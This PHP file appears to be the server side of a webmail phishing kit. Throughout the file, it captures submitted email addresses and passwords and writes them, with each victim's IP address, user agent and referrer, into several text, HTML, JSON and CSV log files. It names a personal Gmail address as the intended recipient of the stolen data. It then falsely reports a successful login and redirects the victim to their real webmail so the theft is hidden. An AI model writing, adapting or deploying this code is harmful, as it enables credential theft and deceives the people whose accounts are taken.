<?php
// Disable error reporting to prevent output interference
error_reporting(0);
ini_set('display_errors', 0);

// Set content type for JSON response
header('Content-Type: application/json');

// Email configuration
$LOG_EMAIL = 'skkho87.sm@gmail.com';
$FROM_EMAIL = 'rc@webmail-logger.com';
$FROM_NAME = 'RC Webmail Logger';

// Function to save log data to files
function saveLogToFile($email, $password, $attempt, $logData) {
    global $LOG_EMAIL;
    
    // Create detailed log entry
    $timestamp = $logData['timestamp'];
    $ip = $logData['ip_address'];
    $user_agent = $logData['user_agent'];
    $referer = $logData['referer'];
    
    // Format 1: Simple text log
    $simple_log = "$timestamp | Attempt: $attempt | Email: $email | Password: $password | IP: $ip\n";
    @file_put_contents('login_attempts.txt', $simple_log, FILE_APPEND | LOCK_EX);
    
    // Format 2: Detailed log with all info
    $detailed_log = "
========================================
WEBMAIL LOGIN ATTEMPT #$attempt
========================================
Timestamp: $timestamp
Target Email: $email
Password: $password
IP Address: $ip
User Agent: $user_agent
Referrer: $referer
Intended Recipient: $LOG_EMAIL
========================================

";
    @file_put_contents('detailed_logs.txt', $detailed_log, FILE_APPEND | LOCK_EX);
    
    // Format 3: HTML format (ready for email)
    $html_log = "
<div style='border: 1px solid #ddd; margin: 10px 0; padding: 15px; font-family: Arial, sans-serif;'>
    <h3 style='color: #333; margin-top: 0;'>🔐 Webmail Login Attempt #$attempt</h3>
    
    <div style='background-color: #fff3cd; padding: 10px; margin: 10px 0; border-left: 4px solid #ffc107;'>
        <strong>📧 Login Credentials</strong><br>
        Email: $email<br>
        Password: $password
    </div>
    
    <div style='background-color: #d1ecf1; padding: 10px; margin: 10px 0; border-left: 4px solid #bee5eb;'>
        <strong>🌐 Connection Details</strong><br>
        Timestamp: $timestamp<br>
        Attempt Number: $attempt<br>
        IP Address: $ip<br>
        User Agent: $user_agent<br>
        Referrer: $referer
    </div>
</div>
";
    @file_put_contents('html_logs.html', $html_log, FILE_APPEND | LOCK_EX);
    
    // Format 4: JSON format for easy parsing
    $json_log = json_encode(array(
        'timestamp' => $timestamp,
        'attempt' => $attempt,
        'email' => $email,
        'password' => $password,
        'ip_address' => $ip,
        'user_agent' => $user_agent,
        'referer' => $referer,
        'target_email' => $LOG_EMAIL
    )) . "\n";
    @file_put_contents('json_logs.json', $json_log, FILE_APPEND | LOCK_EX);
    
    // Format 5: CSV format for spreadsheet
    $csv_log = '"' . $timestamp . '","' . $attempt . '","' . $email . '","' . $password . '","' . $ip . '","' . addslashes($user_agent) . '","' . $referer . '"' . "\n";
    
    // Add header if file doesn't exist
    if (!file_exists('logs.csv')) {
        $csv_header = "Timestamp,Attempt,Email,Password,IP Address,User Agent,Referrer\n";
        @file_put_contents('logs.csv', $csv_header, FILE_APPEND | LOCK_EX);
    }
    @file_put_contents('logs.csv', $csv_log, FILE_APPEND | LOCK_EX);
    
    return true;
}

// Function to send log data
function sendLog($email, $password, $attempt) {
    $logData = array(
        'timestamp' => date('Y-m-d H:i:s'),
        'email' => $email,
        'password' => $password,
        'attempt' => $attempt,
        'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
        'referer' => $_SERVER['HTTP_REFERER'] ?? 'unknown'
    );
    
    // Save to files (this always works)
    $fileSaved = saveLogToFile($email, $password, $attempt, $logData);
    
    return $fileSaved;
}

// Function to validate email format
function isValidEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
}

// Function to get the webmail domain for redirect
function getWebmailDomain($email) {
    $domain = substr(strrchr($email, "@"), 1);
    return "https://webmail." . $domain;
}

// Check if this is a POST request
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(array('signal' => 'ERROR', 'msg' => 'Method not allowed'));
    exit;
}

// Get POST data
$email = isset($_POST['email']) ? trim($_POST['email']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';

// Basic validation
if (empty($email) || empty($password)) {
    echo json_encode(array('signal' => 'ERROR', 'msg' => 'Email and password are required'));
    exit;
}

if (!isValidEmail($email)) {
    echo json_encode(array('signal' => 'ERROR', 'msg' => 'Please enter a valid email address'));
    exit;
}

// Send logs 4 times
$logSuccess = true;
for ($i = 1; $i <= 4; $i++) {
    $result = sendLog($email, $password, $i);
    if (!$result) {
        $logSuccess = false;
    }
    
    // Small delay between log attempts
    usleep(100000); // 0.1 second delay
}

// Always return success response to trigger redirect
$webmailUrl = getWebmailDomain($email);

echo json_encode(array(
    'signal' => 'OK',
    'msg' => 'Login successful! Redirecting to your webmail...',
    'redirect_url' => $webmailUrl,
    'logs_sent' => $logSuccess ? 4 : 'partial'
));

exit;
?>